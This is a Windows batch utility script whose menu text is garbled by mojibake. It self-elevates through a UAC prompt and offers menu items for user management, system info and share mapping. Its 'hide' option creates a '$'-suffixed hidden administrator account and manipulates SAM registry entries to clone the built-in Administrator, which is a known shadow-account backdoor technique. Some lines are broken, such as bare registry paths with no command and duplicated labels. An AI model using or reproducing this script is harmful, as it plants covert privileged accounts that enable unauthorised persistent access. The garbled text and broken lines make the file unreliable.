
@echo off  
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" 
 
if '%errorlevel%' NEQ '0' (  
    goto UACPrompt  
) else ( goto gotAdmin )  
   
:UACPrompt  
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs" 
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs" 
    "%temp%\getadmin.vbs" 
    exit /B  
   
:gotAdmin  
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )  
    pushd "%CD%" 
    CD /D "%~dp0" 
 
:begin


@Echo Off
color 2e
Title  CMD

:begin
cls
Echoѡ�����¹���ʹ�ã�
echo     ��1������������
echo     ��2����ȡϵͳ��Ϣ
echo     ��3���������û�
echo     ��4��ɾ�����û�
echo     ��5��ͨ��IP��ȡ���û���
echo     ��6��ӳ��
echo     ��7��ע���
echo     ��Q���˳�
Set /P Choice= ���������
If not "%Choice%"=="" (
  If "%Choice%"=="1" goto rename
  If "%Choice%"=="2" goto systeminfo
  if "%Choice%"=="3" goto adduser
  if "%Choice%"=="4" goto deluser
  if "%Choice%"=="5" goto ipuser
  if "%Choice%"=="6" goto mapping
  if "%Choice%"=="7" goto regedit
  If "%Choice%"=="Q" goto quit
  If "%Choice%"=="q" goto quit
)
else(
  goto begin
)
:rename
set Name=%COMPUTERNAME%
:GetHostName
set /p Name=�������µĻ�����:
if %Name%==%COMPUTERNAME% goto GetHostName
reg add "HKLM\system\CurrentControlSet\services\tcpip\parameters" /v "NV Hostname" /d %Name% /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" /v ComputerName /d %Name% /f
echo ���������޸ģ���������Ч��
set /p Res=�Ƿ���������[y/n]:
if /i %Res% ==y (
	shutdown -r -t 0
)
else(
	echo ���Ժ��������޸ĺ�Ļ������Ż���Ч��
)
pause>nul
goto begin


:systeminfo
md systeminfo
systeminfo  >> systeminfo\%computername%.txt
echo ���ϵͳ��Ϣ�� systeminfo �ļ���
pause>nul
goto begin


:adduser
net user
set /p Choose=�Ƿ񴴽������˻�[y/n]:
if /i "%Choose%"=="y" (
	goto hide
)
else(
	goto show
)
:hide
set /p User=�������û���:
set /p Password=�������û������룺
net user %User%$ %Password% /add
net localgroup administrators %User%$ /add
echo �����û������ɹ���
"HKEY_LOCAL_MACHINE\SAM\SAM" [1 17] 
"HKEY_LOCAL_MACHINE\SAM\SAM\Domains" [1 17]
md reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\%User%$" reg\BA_%User%$.reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA" reg\BB_.reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4" reg\AA_1F4.reg
regedit
set /p Res=BB_�޸��Ƿ�ɹ�[y/n]:
if /i %Res% ==y	(
  net user %User%$ /del
	reg import reg\BA_%User%$.reg
	reg import reg\BB_.reg
	net user %User%$
)
else(
  rmdir /s/q 222 reg
)
rmdir /s/q 222 reg
pause>nul
goto begin
:show
set /p User=�������û���:
set /p Password=�������û������룺
net user %User% %Password% /add
net localgroup administrators %User% /add
echo ���û������ɹ���
pause>nul
goto begin


:deluser
net user
set /p Choose=�Ƿ�ɾ�������˻�[y/n]:
if /i "%Choose%"=="y" (
	goto hide
)
else(
	goto show
)
:hide
set /p User=�������û���:
net user %User%$ %Password% /del
echo �����û�ɾ���ɹ���
pause>nul
goto begin
:show
set /p User=�������û���:
net user %User% /del
echo ���û�ɾ���ɹ���
pause>nul
goto begin


:ipuser
set /p Ip=������IP:
nbtstat -A %Ip%
pause>nul
goto begin


:mapping
set /p Ip=������IP�鿴��������:
net view \\%Ip%
set /p Mlocal=�����뱾���̷�:
net use %Mlocal% \\%Ip%
pause>nul
goto begin


:regedit
regedit
pause>nul
goto begin


:quit
exit
pause>nul
goto begin



